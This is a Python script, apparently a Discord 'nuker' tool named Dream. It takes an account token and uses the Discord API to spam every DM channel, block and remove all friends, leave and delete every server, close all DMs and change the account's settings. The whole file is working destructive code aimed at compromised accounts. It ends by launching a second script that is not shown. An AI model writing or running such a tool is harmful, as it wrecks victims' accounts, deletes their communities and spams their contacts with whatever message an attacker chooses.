import random
import time
import requests
from colorama import Fore
from concurrent.futures import ThreadPoolExecutor

def set_console_title(title):
    print(title)

def massDM(token, content):
    set_console_title("Dream | Menu | Mass DM")
    headers = {'Authorization': token}
    channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers).json()
    with ThreadPoolExecutor(max_workers=10) as executor:
        for channel in channelIds:
            executor.submit(send_dm, token, channel["id"], content)

def send_dm(token, channel_id, content):
    headers = {'Authorization': token}
    try:
        requests.post(f'https://discord.com/api/v9/channels/{channel_id}/messages',
                      headers=headers,
                      data={"content": content})
        print(f"[ {Fore.LIGHTCYAN_EX}C {Fore.RESET}] ID: {channel_id}")
    except Exception as e:
        print(f"The following error has been encountered and is being ignored: {e}")

def leaveServer(token):
    set_console_title("Dream | Menu | Leave Server")
    headers = {'Authorization': token}
    guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=headers).json()
    for guild in guildsIds:
        try:
            requests.delete(f'https://discord.com/api/v8/users/@me/guilds/{guild["id"]}', headers=headers)
            print(f"[ {Fore.LIGHTCYAN_EX}C {Fore.RESET}] Left Server: {guild['name']}")
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")

def deleteServers(token):
    set_console_title("Dream | Menu | Delete Servers")
    guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers={"Authorization": token}).json()
    for guild in guildsIds:
        try:
            requests.delete(f'https://discord.com/api/v8/guilds/{guild["id"]}', headers={"Authorization": token})
            print(f'[ {Fore.LIGHTGREEN_EX}C {Fore.RESET}] Deleted: {guild["name"]}')
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")

def deleteFriends(token):
    set_console_title("Dream | Menu | Delete Friends")
    friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", headers={"Authorization": token}).json()
    for friend in friendIds:
        try:
            requests.delete(f'https://discord.com/api/v9/users/@me/relationships/{friend["id"]}', headers={"Authorization": token})
            print(f"[ {Fore.LIGHTCYAN_EX}C {Fore.RESET}] Removed Friend: {friend['user']['username']}#{friend['user']['discriminator']}")
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")

def fuckAccount(token):
    set_console_title("Dream | Menu | Fuck Account")
    setting = {
        'theme': 'light',
        'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN']),
        'custom_status': {
            'text': 'Dream Best Discord TOOL',
            'emoji_name': '💀'
        },
        'render_embeds': False,
        'render_reactions': False
    }
    requests.patch("https://discord.com/api/v6/users/@me/settings", headers={"Authorization": token}, json=setting)
    print(f"{Fore.WHITE}[ {Fore.LIGHTCYAN_EX}C {Fore.WHITE}] Fucked his Account")
    time.sleep(2)

def close_all_dms(token):
    set_console_title("Dream | Menu | Close DMs")
    headers = {"authorization": token, "user-agent": "Samsung Fridge/6.9"}
    close_dm_request = requests.get("https://canary.discord.com/api/v8/users/@me/channels", headers=headers).json()
    for channel in close_dm_request:
        print(f"[ {Fore.LIGHTCYAN_EX}C{Fore.RESET} ] {Fore.LIGHTCYAN_EX}ID: "+channel['id'] + Fore.RESET)
        requests.delete(
            f"https://canary.discord.com/api/v8/channels/{channel['id']}",
            headers=headers,)

def blockAllFriends(token):
    set_console_title("Dream | Menu | Block All Friends")
    headers = {"authorization": token, "user-agent": "bruh6/9"}
    json = {"type": 2}
    block_friends_request = requests.get("https://canary.discord.com/api/v8/users/@me/relationships", headers=headers).json()
    for i in block_friends_request:
        requests.put(
            f"https://canary.discord.com/api/v8/users/@me/relationships/{i['id']}",
            headers=headers,
            json=json,
        )
        print(f"{Fore.WHITE}[{Fore.LIGHTCYAN_EX}C{Fore.WHITE}] Blocked Friend | {i['id']}")

def start_nuke():
    token = input("Discord Account Token : ")
    content = input("Mass DM Content : ")
    
    set_console_title("Dream | Menu | Nuker")
    fuckAccount(token=token)
    massDM(token=token, content=content)
    blockAllFriends(token=token)
    leaveServer(token=token)
    deleteServers(token=token)
    deleteFriends(token=token)
    fuckAccount(token=token)
    close_all_dms(token=token)
    
start_nuke()

subprocess.run(["python", "dream2.py"]) 
